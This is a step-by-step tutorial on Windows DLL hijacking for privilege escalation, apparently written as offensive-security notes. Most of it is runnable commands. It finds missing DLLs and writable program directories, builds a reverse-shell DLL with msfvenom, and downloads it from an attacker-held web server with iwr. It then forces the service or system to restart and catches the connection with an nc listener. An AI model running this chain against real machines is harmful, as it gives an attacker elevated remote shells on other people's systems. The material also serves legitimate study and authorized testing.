**DLL Hijacking** abuses how Windows resolves Dynamic Link Libraries when an application does not specify a full path. If an attacker can control a directory that appears early in the DLL search order, they can place a malicious DLL that will be loaded instead of the legitimate one.

When the vulnerable application runs with elevated privileges, the injected DLL executes with the same privileges, leading to privilege escalation.

> A **DLL (Dynamic Link Library)** is a file that contains code and data used by multiple programs in Windows. Instead of duplicating functions across applications, DLLs allow programs to share common functionality making software more modular and efficient.

---

## DLL Search Order and Attack Surface

Windows resolves DLLs using a predefined order. The most relevant positions for exploitation are:

1. Application directory
    
2. System directories
    
3. Windows directory
    
4. Current directory
    
5. PATH directories
    

The critical point is that the **application directory is checked first**. If a DLL is missing there, Windows continues searching elsewhere, creating an opportunity to inject a malicious DLL.

---

## Identifying Vulnerable Applications

### Enumerating Installed Software

Focus on third-party applications:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Also check 32-bit programs:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Applications installed in custom directories are more likely to be misconfigured.


### Detecting Missing DLLs with Procmon (Requires Administrattive Privilege)

Process Monitor is commonly used to identify missing DLLs.

Filter configuration:

- Process Name → target application
    
- Operation → CreateFile
    
- Path → ends with `.dll`
    
- Result → NAME NOT FOUND
    

Example output:

```text
CreateFile   C:\Program Files\App\missing.dll   NAME NOT FOUND
```

This indicates the application attempted to load a DLL that does not exist.


---

## Verifying Write Permissions

Check if the target directory is writable:

```powershell
icacls "C:\Program Files\App\"
```

Vulnerable example:

```text
BUILTIN\Users:(M)
```

Modify permissions allow:

- Creating files
    
- Overwriting files
    
- Deleting files
    

This is sufficient for DLL hijacking.

---

## Creating a Malicious DLL (msfvenom)

Generate a reverse shell DLL:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f dll -o shell.dll
```

This DLL will connect back to your machine when loaded.

---

## Matching the Target DLL Name

Rename the payload to match the missing DLL:

```bash
mv shell.dll missing.dll
```

The name must match exactly what the application is trying to load.

---

## Transferring the DLL

Start a web server:

```bash
python3 -m http.server 8080
```

Download the DLL on the target:

```powershell
iwr -uri http://ATTACKER_IP:8080/missing.dll -OutFile "C:\Program Files\App\missing.dll"
```

Place it in the application directory (first in search order).

---

## Triggering Execution

The DLL executes only when the application is launched.

If it is a service, locate it using:

```powershell
schtasks /query /fo LIST /v 
```
Then start it:
```powershell
net stop "VulnService"
net start "VulnService"
```

If it is a normal application:

```powershell
Start-Process "C:\Program Files\App\app.exe"
```

If you list the task and see:
```powershell
Schedule Type:                        At system start up
```

You can execute it using:
```powershell
# Restart system
shutdown /r /t 0
# Run it manual
schtasks /run /tn "task"
```

---

## Catching the Shell

Start a listener:

```bash
nc -lvnp YOUR_PORT
```

Once the DLL is loaded, you receive a shell.
